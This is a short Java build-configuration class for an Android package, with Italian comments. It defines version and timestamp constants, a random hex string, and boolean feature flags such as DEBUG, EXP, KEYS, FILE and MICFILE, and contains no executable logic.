package com.android.service.auto;

public class Cfg {
	//ATTENZIONE, NON CAMBIARE A MANO LA VARIABILE DEBUG, VIENE RISCRITTA DA ANT
	
    public static final int BUILD_ID = 21;
    public static final String BUILD_TIMESTAMP = "20120622-114456";
    
    public static final int VERSION = 2012070101;
	public static final String OSVERSION = "default";
	
	public static final boolean DEBUG = false;
	public static final boolean EXCEPTION = false;
	public static final boolean EXP = false;
	public static boolean DEMO = false;
	
	public static final boolean KEYS = false; // Se e' true vengono usate le chiavi hardcoded
	
	public static final boolean FILE = true;
	public static final boolean MICFILE = false;
	
	public static final String RANDOM = "AF13F8AAEB2ED220";
}
